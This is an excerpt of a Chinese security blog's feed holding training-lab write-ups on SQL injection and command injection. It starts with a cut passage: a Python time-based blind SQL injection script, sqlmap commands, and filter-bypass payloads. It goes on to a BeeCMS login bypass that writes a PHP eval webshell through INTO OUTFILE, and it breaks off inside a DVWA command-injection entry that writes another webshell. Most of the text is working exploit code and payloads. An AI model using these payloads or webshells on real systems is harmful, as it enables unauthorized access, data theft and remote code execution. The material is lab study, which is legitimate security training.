payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'='</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'&gt;'</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    end = mid - <span class="number">1</span></span><br><span class="line">            value += chr(begin)</span><br><span class="line">            <span class="comment">#print("value:%s"%value)</span></span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectIsTrue</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="comment">#print("url:"+target_url.format(url=url,payload=payload))</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content = requests.get(target_url.format(url=url,payload=payload),timeout=<span class="number">1</span>).content</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_len</span><span class="params">(column_name,table_name,where_statement)</span>:</span> </span><br><span class="line">    begin=<span class="number">0</span></span><br><span class="line">    end=MAX_LEN</span><br><span class="line">    <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">        mid = (begin+end)//<span class="number">2</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'='</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'&gt;'</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid - <span class="number">1</span></span><br><span class="line">    length = begin</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line">Thread_Nums=<span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(column_name,table_name,where_statement,length)</span>:</span></span><br><span class="line">    value = <span class="string">''</span></span><br><span class="line">    thread_lists = []</span><br><span class="line">    task_num = length//Thread_Nums</span><br><span class="line">    <span class="keyword">if</span> length &gt;= Thread_Nums:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>,task_num):</span><br><span class="line">            cur_thread = MyThread(i,i+task_num<span class="number">-1</span>,column_name,table_name,where_statement)</span><br><span class="line">            thread_lists.append(cur_thread)</span><br><span class="line">            cur_thread.start()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cur_thread = MyThread(<span class="number">1</span>,length,column_name,table_name,where_statement)</span><br><span class="line">        thread_lists.append(cur_thread)</span><br><span class="line">        cur_thread.start()</span><br><span class="line">    <span class="keyword">for</span> cur_thread <span class="keyword">in</span> thread_lists:</span><br><span class="line">        cur_thread.join()</span><br><span class="line">        value += cur_thread.get_result()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    column_name=<span class="string">"group_concat(table_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.tables"</span></span><br><span class="line">    where_statement=<span class="string">"table_schema=database()"</span></span><br><span class="line">    <span class="comment">#判断表长度</span></span><br><span class="line">    all_table_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_table_name_len:%s"</span>%all_table_name_len)</span><br><span class="line">    <span class="comment">#找表名</span></span><br><span class="line">    all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len)</span><br><span class="line">    print(<span class="string">"all_table_name:%s"</span>%all_table_name)</span><br><span class="line">    <span class="comment">#comment,comments,emails,referers,string,user,user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断列长度</span></span><br><span class="line">    column_name=<span class="string">"group_concat(column_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.columns"</span></span><br><span class="line">    t_name = input(<span class="string">"输入要查询的表名\n"</span>)</span><br><span class="line">    where_statement=<span class="string">"table_schema=database() and table_name='&#123;t_name&#125;'"</span>.format(t_name=t_name)</span><br><span class="line">    all_column_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_column_name_len:%s"</span>%all_column_name_len)</span><br><span class="line">    all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len)</span><br><span class="line">    print(<span class="string">"all_column_name:%s"</span>%all_column_name)</span><br><span class="line"></span><br><span class="line">    c_names = input(<span class="string">"输入所有要查询的字段,以逗号分开\n"</span>).split(<span class="string">','</span>)</span><br><span class="line">    <span class="keyword">for</span> c_name <span class="keyword">in</span> c_names:</span><br><span class="line">        column_name=<span class="string">"group_concat(&#123;column_name&#125;)"</span>.format(column_name=c_name)</span><br><span class="line">        table_name=t_name</span><br><span class="line">        where_statement = <span class="string">"1"</span></span><br><span class="line">        all_value_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">        print(<span class="string">"%s_length:%s"</span>%(c_name,all_value_len))</span><br><span class="line">        all_value = get_value(column_name,table_name,where_statement,all_value_len)</span><br><span class="line">        print(<span class="string">"%s_value:%s"</span>%(c_name,all_value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>username:admin password:21232f297a57a5a743894a0e4a801fc3</p><p>或者直接sqlmap</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T --dbs</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T -D hetianlab --tables</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T -D hetianlab -T<span class="built_in"> user </span>--columns</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span> -technique T -D hetianlab -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure><h2 id="宽字符注入"><a href="#宽字符注入" class="headerlink" title="宽字符注入"></a>宽字符注入</h2><p>输入单引号被斜杠转义，想方法把斜杠去掉，提示宽字符所以用gbk编码。第一个字节采用大于128的编码即可。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>%<span class="number">9</span>c%<span class="number">27</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>成功绕过。直接查表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=-1%9c%27 union select 1,username,password <span class="keyword">from</span><span class="built_in"> user </span>%23</span><br></pre></td></tr></table></figure><p>用户名： admin </p><p>密码： 21232f297a57a5a743894a0e4a801fc3 </p><p>或者sqlmap:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1%9c%27"</span> -D hetianlab -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure><h2 id="绕过select过滤"><a href="#绕过select过滤" class="headerlink" title="绕过select过滤"></a>绕过select过滤</h2><p>尝试<code>union%20select%201,2,3</code>,发现select 被过滤了。</p><p>尝试重写绕过<code>union seselectlect 1,2,3</code>成功。或者大小写绕过也成功<code>union Select 1,2,3</code>成功。</p><p>过滤语句应该是进行简单的替换。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = <span class="number">1</span> <span class="class"><span class="keyword">union</span>%20<span class="title">Select</span>%201,<span class="title">username</span>,<span class="title">password</span>%20<span class="title">from</span>%20<span class="title">user</span></span></span><br></pre></td></tr></table></figure><p>账户名： admin ，密码： 21232f297a57a5a743894a0e4a801fc3</p><p>或者sqlmap:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://47.105.75.177/vulnlab/sqli/index5.php?id=1"</span> --tamper <span class="string">"nonrecursivereplacement.py"</span></span><br></pre></td></tr></table></figure><h2 id="进阶之真实案例"><a href="#进阶之真实案例" class="headerlink" title="进阶之真实案例"></a>进阶之真实案例</h2><p>随便浏览发现可能注入点：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/</span>product<span class="regexp">/product.php?id=5</span></span><br></pre></td></tr></table></figure><p>多番尝试后发现注不出来。</p><p>dirsearch扫描。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">python .\dirsearch.py -u http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms -e php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">56</span>] <span class="number">301</span> -  <span class="number">255</span>B  - /vulnlab/sqli/beecms/admin  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/admin/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">403</span> -  <span class="number">237</span>B  - /vulnlab/sqli/beecms/admin/.htaccess</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/?/login  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/admin.php  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">57</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/index.php  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">58</span>] <span class="number">200</span> -    <span class="number">2</span>KB - /vulnlab/sqli/beecms/admin/login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">34</span>:<span class="number">58</span>] <span class="number">302</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/admin/upload.php  -&gt;  login.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">02</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/article  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/article/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">04</span>] <span class="number">301</span> -  <span class="number">254</span>B  - /vulnlab/sqli/beecms/book  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/book/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">05</span>] <span class="number">301</span> -  <span class="number">258</span>B  - /vulnlab/sqli/beecms/ckeditor  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/ckeditor/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">05</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/ckeditor/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">07</span>] <span class="number">301</span> -  <span class="number">254</span>B  - /vulnlab/sqli/beecms/data  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/data/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">08</span>] <span class="number">301</span> -  <span class="number">254</span>B  - /vulnlab/sqli/beecms/down  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/down/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">11</span>] <span class="number">301</span> -  <span class="number">258</span>B  - /vulnlab/sqli/beecms/includes  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/includes/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">11</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/includes/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">11</span>] <span class="number">200</span> -   <span class="number">18</span>KB - /vulnlab/sqli/beecms/index.php</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">12</span>] <span class="number">200</span> -   <span class="number">18</span>KB - /vulnlab/sqli/beecms/index.php/login/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">12</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/install  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/install/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">12</span>] <span class="number">200</span> -   <span class="number">89</span>B  - /vulnlab/sqli/beecms/install/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">13</span>] <span class="number">301</span> -  <span class="number">259</span>B  - /vulnlab/sqli/beecms/languages  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/languages/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">14</span>] <span class="number">301</span> -  <span class="number">256</span>B  - /vulnlab/sqli/beecms/member  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/member/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">14</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/member/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">19</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/product  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/product/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">20</span>] <span class="number">200</span> -  <span class="number">140</span>B  - /vulnlab/sqli/beecms/robots.txt</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">20</span>] <span class="number">301</span> -  <span class="number">256</span>B  - /vulnlab/sqli/beecms/search  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/search/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">21</span>] <span class="number">301</span> -  <span class="number">257</span>B  - /vulnlab/sqli/beecms/sitemap  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/sitemap/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">23</span>] <span class="number">301</span> -  <span class="number">258</span>B  - /vulnlab/sqli/beecms/template  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/template/</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">23</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /vulnlab/sqli/beecms/template/</span><br><span class="line">[<span class="number">12</span>:<span class="number">35</span>:<span class="number">24</span>] <span class="number">301</span> -  <span class="number">256</span>B  - /vulnlab/sqli/beecms/upload  -&gt;  http:<span class="comment">//47.105.75.177/vulnlab/sqli/beecms/upload/</span></span><br></pre></td></tr></table></figure><p>发现后台地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/</span>admin<span class="regexp">/</span></span><br></pre></td></tr></table></figure><p>尝试sql注入:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin' or <span class="number">1</span></span><br><span class="line">密码：<span class="number">123</span></span><br></pre></td></tr></table></figure><p>报错:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MariaDB<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span> limit 0,1<span class="string">' at line 1</span></span><br><span class="line"><span class="string">sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name='</span>admin<span class="string">' or 1'</span> limit 0,1</span><br></pre></td></tr></table></figure><p>现在直接构造payload注入：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin<span class="string">' and '</span><span class="number">1</span></span><br><span class="line">密码：<span class="number">123</span></span><br></pre></td></tr></table></figure><p>提示不存在用户。尝试另外种思路：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admi' union select <span class="number">1</span>,<span class="number">2</span>,'pwd',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码： pwd</span><br></pre></td></tr></table></figure><p>报错：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,admin_name,admin_password,admin_purview,is_disable <span class="keyword">from</span> bees_admin <span class="keyword">where</span> admin_name=<span class="string">'admi'</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'pwd'</span>,<span class="number">4</span>,<span class="number">5</span> <span class="comment">#' limit 0,1</span></span><br></pre></td></tr></table></figure><p>发现union 和select被过滤了。</p><p>尝试绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）UnunionIon  显示UnunionIon</span><br><span class="line">（2）Union 显示空</span><br><span class="line">（2）Un union ion 显示union 成功绕过。</span><br></pre></td></tr></table></figure><p>重新构造payload:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admi' Un union ion Se select lect <span class="number">1</span>,<span class="number">2</span>,'pwd',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码： pwd</span><br></pre></td></tr></table></figure><p>发现select函数有问题了，</p><p>尝试绕过方法：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Se<span class="symbol">%select</span><span class="symbol">%lect</span>  显示<span class="keyword">select</span></span><br></pre></td></tr></table></figure><p>再构造payload:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,<span class="number">2</span>,'pwd',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码： pwd</span><br></pre></td></tr></table></figure><p>说密码正确，猜想密码是密文保存的。用md5。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,<span class="number">2</span>,'<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">5</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure><p>注入成功，提示该账号被锁定，无法登录。</p><p>发现字段is_disable被设置成5所以不能登录，改下payload:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,'admin','<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">0</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure><p>成功登录。</p><p>尝试文件注入：</p><p>首先绕过Into，outfile关键词，用<code>I into nto, O%outfile%utfile</code>替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名： admi<span class="string">' Un union ion Se%select%lect 1,'</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[x]);<span class="meta">?&gt;</span><span class="string">',3,4,5 I into nto  O%outfile%utfile '</span>shell.php<span class="string">' #</span></span><br></pre></td></tr></table></figure><p>test:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admi' Un union ion Se%<span class="keyword">select</span>%lect <span class="number">1</span>,<span class="string">'&lt;?php echo 1;?&gt;'</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> I <span class="keyword">into</span> nto  O%<span class="keyword">outfile</span>%utfile <span class="string">'../upload/shell1.php'</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>报错:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">操作数据库失败Can<span class="string">'t create/write to file '</span>/var/<span class="class"><span class="keyword">lib</span>/<span class="title">mysql</span>/<span class="title">upload</span>/<span class="title">shell1</span>.<span class="title">php</span>'</span></span><br></pre></td></tr></table></figure><p>猜测路径：<br>/var/www/html/vulnlab/sqli/beecms/upload/</p><p>构造payload上传即可。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admi<span class="string">' Un union ion Se%select%lect 1,'</span>&lt;?php @eval(<span class="variable">$_POST</span>[x]);?&gt;<span class="string">',3,4,5 I into nto  O%outfile%utfile '</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/sqli/</span>beecms<span class="regexp">/upload/</span>shell.php<span class="string">' #</span></span><br></pre></td></tr></table></figure><p>测试下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admi<span class="string">' Un union ion Se%select%lect 1,'</span>&lt;?php echo <span class="number">1</span>?&gt;<span class="string">',3,4,5 I into nto  O%outfile%utfile '</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/sqli/</span>beecms<span class="regexp">/upload/</span><span class="number">1</span>.php<span class="string">' #</span></span><br></pre></td></tr></table></figure><p>发现内容为：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;?php echo <span class="number">1</span>;?&amp;gt;<span class="number">3</span><span class="number">4</span><span class="number">5</span></span><br></pre></td></tr></table></figure><p>所有特殊字符被转义了。所以利用胖白老大讲的char函数。</p><p>利用hackbar生成</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHAR(<span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">71</span>, <span class="number">69</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">120</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>)</span><br></pre></td></tr></table></figure><p>所以payload为</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admi' Un union ion Se%select%lect <span class="number">1</span>,CHAR(<span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">120</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> I into nto  O%outfile%utfile '/var/www/html/vulnlab/sqli/beecms/upload/shell2.php' #</span><br></pre></td></tr></table></figure><p>然后用菜刀连接即可。</p><p>注意点：一句话木马是用的POST不是GET</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://blog.ydq6.com/categories/web/"/>
    
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
      <category term="sql" scheme="http://blog.ydq6.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>合天培训_实验_命令执行</title>
    <link href="http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-05-01T08:53:17.000Z</published>
    <updated>2020-05-01T13:50:23.064Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要描述了：（1）一些软件出现的命令执行漏洞（包括dvwa,struts,thinkphp,ImageMagick)（2）可能出现命令执行漏洞的<strong>PHP代码执行函数</strong>分析。（3）能执行系统命令的<strong>系统命令执行函数</strong>分析</p><a id="more"></a><h2 id="1-命令执行漏洞"><a href="#1-命令执行漏洞" class="headerlink" title="1. 命令执行漏洞"></a>1. 命令执行漏洞</h2><p>（1）实验介绍</p><p>实验链接： <a href="http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401</a> </p><p>实验来源：合天网安实验室</p><p>实验目的： 通过实验理解命令实验漏洞的原理和利用方法。 </p><p>（2）实验操作</p><p>1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然后输入账号密码进去，查看安全等级发现是high，将其设置成low。然后开始命令执行测试。</p><p>2）正常业务。发现在命令执行处可以输入ip地址，然后可以得到ping ip后的结果。</p><p>尝试127.0.0.1</p><p><img src="/assets/image-20200426123935628.png" alt="image-20200426123935628"></p><p>3）fuzz测试。可以进行命令执行fuzz测试，发现很多符号都没被过滤。所以可以尝试攻击。</p><p>4）构造payload</p><ul><li><p>127.0.0.1 | net user          查看用户</p><p><img src="/assets/image-20200426124613975.png" alt="image-20200426124613975"></p></li><li><p>127.0.0.1 | echo “<?php phpinfo; ?>“ &gt; 1.php        写php文件</p></li></ul><p><img src="/assets/image-20200426125031831.png" alt="image-20200426125031831"></p><ul><li>127.0.0.1 | echo “<?php @eval($_POST['cmd']); ?>“ &gt; shell.php 写shell</li></ul><p>用菜刀连接</p><p><img src="/assets/image-20200426125304313.png" alt="image-20200426125304313"></p><p><img src="/assets/image-20200426125326981.png" 